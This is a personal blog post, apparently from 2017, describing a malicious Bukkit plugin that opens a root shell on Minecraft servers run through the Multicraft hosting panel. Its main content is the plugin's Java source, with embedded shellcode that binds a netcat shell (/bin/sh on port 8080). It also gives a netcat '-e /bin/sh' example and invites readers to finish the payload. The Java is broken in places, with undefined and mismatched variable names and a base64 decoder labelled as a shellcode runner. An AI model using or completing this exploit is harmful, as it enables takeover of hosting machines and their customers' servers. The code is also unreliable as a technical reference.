---
title: "Exploiting Flawed Software: A Tale of Minecraft, Multicraft, and Rooting - Part 1"
layout: post
date: 2017-06-19 23:40
image: /assets/images/multicraft.png
headerImage: true
tag:
- exploit
- security
- project
- tech
- linux
- java
- shellcode
- netcat
- 0day
- open source
- rootkit
- minecraft
category: blog
author: samlim
description: An old project that may pique the interest for those of you interested in Minecraft, exploitation, cybersecurity, and Linux
---

# Introduction
Hello everybody!

Back in my school days when I was a wee lad (8th grade or so), I began to foster a passion for cybersecurity. Back then I also adored the then-indie game [Minecraft](https://minecraft.net/en-us/). Since I played that game it has since been purchased by Microsoft, and man did that game go downhill. Please do excuse my harsh critique, maybe it's just the nostalgia I miss :-)

I spent more time with that game than I care to admit. However towards the end of my virtual endeavors as miner, I began to become more and more interested in the _server hosting_ and plugin development aspects of the game. What followed were several attempts at starting my own personal multiplayer server and writing my own plugins: I lasted sveral months, in which I made several thousand dollars worth of donations from my players and learned a bit of Java. _All from a video game!_

_Not too important right now, but the volatility of these types of servers and the potential revenue achievable will make more sense later as I explain why exactly "hacking" (ethical or not) is so appealing_

But what had really kindled my interest in this type of computer/network work was server management (in particular Linux and Unix systems), and along with that, exploitation. After some lengthy time familiarizing myself with commonly-used Unix environments and how exactly one goes about exploiting the various pieces of software being run on said machine, my prior experience with Minecraft hosting, server management, and Linux led me to quite the discovery: an exploit that would eventually lead to _[remote shell access](http://resources.infosecinstitute.com/icmp-reverse-shell/)_, [_arbitrary code execution_](https://en.wikipedia.org/wiki/Arbitrary_code_execution), and eventual [_privelage escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) by taking advantage of any machines running the widely-used commercial hosting platform known as [Multicraft](https://www.multicraft.org/).

# The Peculiar Case of Multicraft

### Background Terminology
First of all, we need to define what exactly the infamous "root" terminology means. Some may have heard it as a verb:
> Example:
> * "Jane roots many servers"
> * "Dick is rooting the machine right now"

In most Linux distros/flavors the hierarchy of users and user privelages can be set by the [_administrator_](https://en.wikipedia.org/wiki/System_administrator), or *root* user. In Linux, when you are logged into your machine or virtual private server as the root user, one has full administrative privelages; access to any and all commands. As a safety precaution, it is not generally advised to never use the root user for server upkeep, such as managing packages, configuring software, etc. It is always recommended to create additional user accounts, and giving them permissions manually. Giving someone "administrative" privelages is done by adding that user as a "sudoer". As someone with this access, they are able to run any commands _as root_.

### What does Multicraft do?
In a basic sense, Multicraft is a software that automates the purchasing and delegation of renting a Minecraft game server, what is commonly referred to as a hosting platform. What this does is automate user creation, group and permission management, VPS creation, and offers a web-based control panel for managing the game as a server administrator.

## Multicraft's Achilles Heel
The fundamental flaw I found in the aforementioned Multicraft software was that _it ran as root_. This software has full administrative control over the entire machine: And due to this oversight in security, with some exploitation the possibility opens for any customer (or anyone with access to said customer's account) renting a virtual game server hosted on a Multicraft platform can make it possible for said user to effectively break out of their virtual environment scope gaining access to the entirety of the root machine simply by abusing Multicraft's root privelages.

Popular Minecraft server software [Bukkit](https://bukkit.org/) was an extension of the officially offered vanilla server client. Bukkit added many more features such as the ability to add community-built plugins to be loaded alongside the game server, effectively allowing a more custom game experience. Various game modes, administrative tools, and more. Bukkit also offered extensive documentation and tools for plugin development itself. This was key in achieving the first step of a total-server-takeover; remote access. So we built our own Bukkit plugin - but this wasn't your average "capture the flag" gamemode.

Our plugin utilized shellcode to take advantage of Multicraft's privelage flaws in order to bind a shell on said server.

# Source Code

The following is the sourcecode for said plugin, with some censorship due to privacy:

    package com.shellcodefun;

        import java.io.File;
        import java.io.FileOutputStream;
        import org.bukkit.plugin.java.JavaPlugin;

        public final class GimmeRoot extends JavaPlugin {
        /*
         * ##
         * # Old semi-updated version
         * ##
         * [REDACTED] Shell - [Redacted], s.lim
         * a [REDACTED] project
         */

        public String payload = "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e
                                \x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80
                                \xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d
                                \x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";

        public static void execute(String x) {
            System.out.println("[LOCAL ROOT 0DAY] " + x);
        }

        public void onEnable(){
            try {
                Runtime friend = Runtime.getRuntime();
                if (cmd.getName().equalsIgnoreCase("shell")) {
                    execute("Executing payload...")
                    byte[] y = run_shellcode(payload);
                    execute("Decrypted payload");
                    execute("Saved payload as " + ma_homie);
                    execute("listening on port 8080");
                    execute("bl1NG Bl1ing, to reinitialize shell use the bukkit 'reload' command");
                }
            }
            catch(Exception e) {
                System.out.println("uh oh, error baby: " + e.toString());
            }

        }

        @Override
        public void onDisable() {
        }

        private final static char[] char_map = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                .toCharArray();

        private static int[] java_sucks = new int[128];

        static {
            for (int i = 0; i < char_map.length; i++) {
                java_sucks[char_map[i]] = i;
            }
        }
        public static byte[] run_shellcode(String da_shell_code) {
            int sanitize_mah_hax = da_shellcode.endsWith("==") ? 2 : da_shellcode.endsWith("=") ? 1 : 0;
            byte[] the_shiznit = new byte[da_shellcode.length() * 3 / 4 - sanitize_mah_hax];
            int sinker = 0xFF;
            int root_time = 0;
            for (int i = 0; i < da_shellcode.length(); i += 4) {
                int c0 = java_sucks[da_shellcode.charAt(i)];
                int c1 = java_sucks[da_shellcode.charAt(i + 1)];
                the_shiznit[root_time++] = (byte) (((c0 << 2) | (c1 >> 4)) & sinker);
                if (root_time >= the_shiznit.length) {
                    return the_shiznit;
                }
                int c2 = java_sucks[da_shellcode.charAt(i + 2)];
                the_shiznit[root_time++] = (byte) (((c1 << 4) | (c2 >> 2)) & sinker);
                if (root_time >= the_shiznit.length) {
                    return the_shiznit;
                }
                int c3 = java_sucks[da_shellcode.charAt(i + 3)];
                the_shiznit[root_time++] = (byte) (((c2 << 6) | c3) & sinker);
            }
            return the_shiznit;
        }
    }

## Explanation
Essentially when this plugin is ran on a Multicraft hosted server, running the command '/shell' _(see: onEnable() method)_ took our `payload` string (the shellcode), decrypted said payload, saved it on the server, and launched a remote shell listening on port 8080 accessible by us.

### But wait - what the hell is shellcode?
So shellcode is compiled [ASM](https://www.tutorialspoint.com/assembly_programming/), more commonly known as _Assmembly_. This is essentially writing code as _actual machine code bytes_. For those of you familiar with C, think of [_exec functions_](https://linux.die.net/man/2/execve). So when utilizing shellcode for server exploitation, more often than not it is simply a call to `/bin/sh` _(commonly a symlink to /bin/bash, see [Ubuntu](https://www.ubuntu.com/))_ + (in our case) the _[Netcat](http://nc110.sourceforge.net/)_ open shell command. As per Netcat's documentation, the `-e` flag opens a shell.

For example, it may look something like this: `nc -e /bin/sh 127.0.0.1 31337`, in which netcat then pipes communication to the machine's shell (`/bin/sh` or sometimes `/bin/bash`).

_I will include a link in the Further Reading section of this post for an extensive in-depth Linux shellcoding tutorial._

The following is the shellcode we created for our project, slightly altered so that I am not publishing a working-exploit :) _(but with a little bit of research into netcat and shellcoding it shouldn't be too difficult for any of you amateur white/blackhats to get working)_

    public String payload = "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e
                            \x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80
                            \xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d
                            \x65\x2f\x62\x69\x6e\x2f\x73\x68\x23"

What this does is do exactly as I described several paragraphs up. This binds netcat to /bin/sh and begins listening on port 8080. As soon as this is initialized, one can open a netcat prompt and connect to the remote-host:8080, and begin any sort of reconnaissance, pentesting, privelage escalation, backdooring, and even more from there.

This is Part 1 of a cybersecurity/exploitation series I will be doing. For the next installment I will go into detail on exploitation from a reverse shell.

## Further Reading
* [Linux Shellcoding - Tutorial](https://0x00sec.org/t/linux-shellcoding-part-1-0/289)

* [Reverse Shell Connection with Netcat](https://null-byte.wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over-any-open-port-using-netcat-bash-0132658/)

* [What is a 'Rootkit?'](https://en.wikipedia.org/wiki/Rootkit)